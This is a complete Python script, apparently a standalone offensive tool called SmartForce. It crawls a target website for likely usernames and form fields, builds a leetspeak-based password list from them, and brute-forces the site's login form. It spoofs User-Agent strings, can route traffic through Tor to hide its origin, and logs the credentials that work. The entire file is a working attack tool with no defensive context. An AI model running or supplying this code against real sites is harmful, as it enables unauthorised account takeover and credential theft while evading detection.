import requests
from bs4 import BeautifulSoup
import random
import re
import argparse
from urllib.parse import urljoin
from collections import defaultdict

# ====== Utility Functions ======

def leetspeak(word):
    return word.translate(str.maketrans("aAeEiIoOsStTgG", "@@331100$$77g9"))

def build_passwords(usernames):
    suffixes = ["123", "2024", "2024!", "@123", "007", "#1", "pass", "pwd"]
    prefixes = ["admin", "cliente", "marketing", "tucuman", "deck"]
    passwords = set()

    for user in usernames:
        lower = user.lower()
        leet = leetspeak(lower)
        for suf in suffixes:
            passwords.add(lower + suf)
            passwords.add(leet + suf)
        for pre in prefixes:
            passwords.add(pre + lower)
            passwords.add(pre + leet)
        passwords.add(lower + lower)
        passwords.add(lower.capitalize() + random.choice(suffixes))

    with open("passwords.txt", "w") as f:
        for pwd in passwords:
            f.write(pwd + "\n")

    return list(passwords)

# ====== Web Scraper ======

def crawl_site(base_url, max_pages=10):
    visited = set()
    to_visit = [base_url]
    found_usernames = set()
    found_fields = set()

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop()
        if url in visited:
            continue
        try:
            res = requests.get(url, timeout=5)
            visited.add(url)
            soup = BeautifulSoup(res.text, 'html.parser')

            # Extract input names
            for inp in soup.find_all("input"):
                name = inp.get("name")
                if name and len(name) >= 3:
                    found_fields.add(name)

            # Extract potential usernames
            text = soup.get_text()
            potential_users = re.findall(r"\b[A-Z][a-z]{2,20}\b", text)
            found_usernames.update(potential_users)

            # Extract internal links
            for a in soup.find_all("a", href=True):
                href = a['href']
                full_url = urljoin(base_url, href)
                if base_url in full_url and full_url not in visited:
                    to_visit.append(full_url)

        except Exception as e:
            print(f"[!] Failed to access: {url} ({e})")

    with open("usernames.txt", "w") as f:
        for user in found_usernames:
            f.write(user + "\n")

    return list(found_usernames), list(found_fields)

# ====== Brute-force Login Attempt ======

def brute_force_login(login_url, usernames, passwords, user_field, pass_field, single_user=None, single_pass=None, use_proxy=False):
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0", "Chrome/90", "Safari/537", "Edge/18", "Opera/9.80"
        ]),
        "Content-Type": "application/x-www-form-urlencoded"
    }

    proxies = {
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    } if use_proxy else None

    results = []

    print("\n🚀 Starting brute-force...")
    for user in (usernames if not single_user else [single_user]):
        for pwd in (passwords if not single_pass else [single_pass]):
            data = {user_field: user, pass_field: pwd}
            try:
                res = requests.post(login_url, data=data, headers=headers, timeout=5, proxies=proxies)
                success = False

                # Improved success detection logic
                if res.status_code == 200:
                    if any(s in res.text.lower() for s in ["logout", "dashboard", "bienvenido", "perfil"]):
                        success = True
                    if res.history and any(r.status_code == 302 for r in res.history):
                        success = True

                line = {
                    "username": user,
                    "password": pwd,
                    "success": success
                }
                results.append(line)
                if success:
                    print(f"[✓] SUCCESS: {user}:{pwd}")
                else:
                    print(f"[✗] Failed: {user}:{pwd}")
            except Exception as e:
                print(f"[!] Error: {e}")

    # Save results to JSON file
    import json
    with open("smartforce_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print("\n[+] Results saved to smartforce_results.json")

# ====== Main Interface ======

def resolve_field_name(input_value, input_fields):
    try:
        index = int(input_value)
        if 0 <= index < len(input_fields):
            return input_fields[index]
    except ValueError:
        pass
    return input_value.strip()

def main():
    parser = argparse.ArgumentParser(description="SmartForce - AI-assisted Web Login Bruteforcer")
    parser.add_argument("url", help="Target site URL (e.g. https://example.com)")
    parser.add_argument("--proxy", action="store_true", help="Use TOR proxy (localhost:9050)")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    print(f"🔍 Crawling site: {base_url} ...")

    usernames, input_fields = crawl_site(base_url)
    print(f"\n[+] Found {len(usernames)} usernames:")
    print(", ".join(usernames[:10]) + (" ..." if len(usernames) > 10 else ""))

    print(f"\n[+] Found {len(input_fields)} input fields:")
    for i, f in enumerate(input_fields):
        print(f"[{i}] {f}")

    if not usernames or not input_fields:
        print("[-] Not enough data found. Try a different site.")
        return

    passwords = build_passwords(usernames)
    print(f"\n🔐 Generated {len(passwords)} smart passwords.")

    print("\n📍 Please enter the login form URL (POST endpoint):")
    login_url = input("🔗 Login URL: ").strip()

    manual_user = input("🔑 Do you want to try ALL usernames? (y/n): ").lower() == 'y'
    if manual_user:
        single_user = None
    else:
        single_user = input("Enter single username to try: ").strip()

    manual_pass = input("🔒 Do you want to try ALL passwords? (y/n): ").lower() == 'y'
    if manual_pass:
        with open("passwords.txt") as f:
            passwords = [line.strip() for line in f if line.strip()]
        single_pass = None
    else:
        single_pass = input("Enter single password to try: ").strip()

    user_field_input = input("Username field name or index: ")
    user_field = resolve_field_name(user_field_input, input_fields)

    pass_field_input = input("Password field name or index: ")
    pass_field = resolve_field_name(pass_field_input, input_fields)

    brute_force_login(
        login_url,
        usernames,
        passwords,
        user_field,
        pass_field,
        single_user=single_user,
        single_pass=single_pass,
        use_proxy=args.proxy
    )

if __name__ == "__main__":
    main()
